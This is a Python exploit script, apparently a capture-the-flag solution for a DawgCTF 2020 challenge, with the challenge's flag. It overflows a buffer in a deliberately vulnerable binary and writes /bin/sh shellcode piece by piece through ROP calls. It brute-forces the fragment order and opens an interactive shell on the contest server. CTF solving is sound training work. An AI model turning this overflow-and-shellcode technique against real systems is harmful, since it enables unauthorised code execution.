#!/usr/bin/python2

"""
John Cunniff
NYUSEC
DawgCTF 2020: Where we roppin boys? (350)

flag: DawgCTF{f0rtni9ht_xD}
"""

from pwn import *
import itertools
import time
import os
import multiprocessing

local = 1

context.log_level = 'warn'
context.terminal = ['/usr/bin/termite', '-e']
e = ELF('./rop')

loot = '\xc0\x40\xcd\x80'
lonely = '\xc1\x89\xc2\xb0'
tilted = '\x31\xc0\x50\x68'
snobby = '\x68\x2f\x62\x69'
dusty = '\x0b\xcd\x80\x31'
junk = '\x2f\x2f\x73\x68'
grove = '\x6e\x89\xe3\x89'

c=[
    grove,
    junk,
    dusty,
    snobby,
    tilted,
    lonely,
    loot,
]

m = {
    grove: e.sym.greasy_grove,
    junk: e.sym.junk_junction,
    dusty: e.sym.dusty_depot,
    snobby: e.sym.snobby_shores,
    tilted: e.sym.tilted_towers,
    lonely: e.sym.lonely_lodge,
    loot: e.sym.loot_lake,
}


def oracle(chain, local=True, stay=False):
    p = process('./rop') if local else remote('ctf.umbccd.io', 4100)
    p.recvuntil('?\n')

    """
    Since we only can overwrite the pushed eip and one more dword,
    we need to go one at a time, returning to the tryme function.
    """
    for i in chain:
        p.send('0000111122223333' + p32(i) + p32(e.sym.tryme))

    """
    Once we have our shell code written, then we can ret to the
    win function.
    """
    p.sendline('0000111122223333' + p32(e.sym.win))

    r=False
    try:
        """
        We need to let a moment pass here to let the shellcode
        execute, and hopfully open a new process. If we send
        the echo before this process starts, that input may only
        be passed to the original program.

        This sendline will error out if the rop program crashes.
        """
        time.sleep(0.5)
        p.sendline('echo abc123')

        """
        Here we're just trying to read with a one second timeout.
        If we don't get an EOF error, we probably just got shell.
        """
        if p.recv(1024, 1):
            if stay:
                p.interactive()
            r=True
    except EOFError:
        pass
    finally:
        p.close()

    return r


def doit(com):
    """
    Take a permutation of the shellcode fragments and transform
    them into a chain of addresses. We'll then test the chain
    with the oracle function and report if there was a success.
    """
    chain = list(map(lambda x: m[x], com))
    if oracle(chain):
        print disasm(''.join(com))
        print chain
        print '=' * 20
        return chain
    return None

"""
To speed things up, we're going to use a python multiprocessing
pool. We can deligate all the rop chain permutations to the pool.
Since python does weird stuff with their multiprocessing libraries,
we'll need to be careful to only pass back and forth simple objects
to and from the workers.
"""
pool = multiprocessing.Pool(500) # you may want to lower this on your machine
chains = pool.map(doit, itertools.permutations(c))
pool.close()

"""
Filter out the None's to just get the chains that passed.
"""
chains = filter(lambda x: x is not None, chains)

"""
Try them all to see if they work.
"""
local=0
for i in chains:
    oracle(i, False, True)

